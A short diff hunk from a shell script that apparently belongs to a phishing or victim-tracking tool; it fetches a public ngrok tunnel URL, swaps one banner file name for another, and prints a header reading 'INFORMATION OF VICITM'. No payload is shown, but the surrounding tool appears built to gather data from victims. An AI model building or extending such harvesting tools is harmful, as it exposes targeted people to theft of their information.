@@ -60,7 +60,7 @@ echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                            echo ""
                            echo ""
-                           cat BlackMafiaLovehacker
+                           cat lovehacker404
                            echo -e "\e[96m==========\e[91m INFORMATION OF VICITM \e[96m========== \e[93m"
                            echo ""
                            echo "" 
